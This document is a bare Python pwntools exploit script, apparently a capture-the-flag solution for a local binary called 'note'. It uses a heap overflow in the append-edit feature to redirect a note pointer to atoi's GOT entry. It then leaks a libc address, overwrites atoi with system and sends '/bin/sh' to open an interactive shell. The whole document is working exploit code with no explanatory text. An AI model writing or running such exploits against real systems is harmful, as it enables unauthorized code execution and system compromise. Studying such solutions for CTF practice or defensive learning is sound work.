from pwn import *

p=process('./note')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def newnote(length,x):
    p.recvuntil('--->>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(length))
    p.recvuntil(':')
    p.sendline(x)

def editnote_append(id,x):
    p.recvuntil('--->>')
    p.sendline('3')
    p.recvuntil('id')
    p.sendline(str(id))
    p.recvuntil('append')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(x)

def editnote_overwrite(id,x):
    p.recvuntil('--->>')
    p.sendline('3')
    p.recvuntil('id')
    p.sendline(str(id))
    p.recvuntil('append')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(x)

def shownote(id):
    p.recvuntil('--->>')
    p.sendline('2')
    p.recvuntil('id')
    p.sendline(str(id))


p.recvuntil('name:')
p.send('a'*0x30+p64(0)+p64(0x70))
p.recvuntil('address:')
p.sendline(p64(0)+p64(0x70))
#gdb.attach(p)

newnote(128,94*'a')
editnote_append(0,'b'*34+p64(0x602120))#ptr_addr

atoi_got = 0x602088
newnote(0x60,p64(atoi_got))

shownote(0)
p.recvuntil('is ')
atoi_addr = u64(p.recvline().strip('\n').ljust(8, '\x00'))
atoi_libc=libc.symbols['atoi']
sys_libc=libc.symbols['system']
system=atoi_addr-atoi_libc+sys_libc
print "system="+hex(system)

editnote_overwrite(0,p64(system))
#gdb.attach(p)
p.recvuntil('--->>')
p.sendline('/bin/sh')
p.interactive()
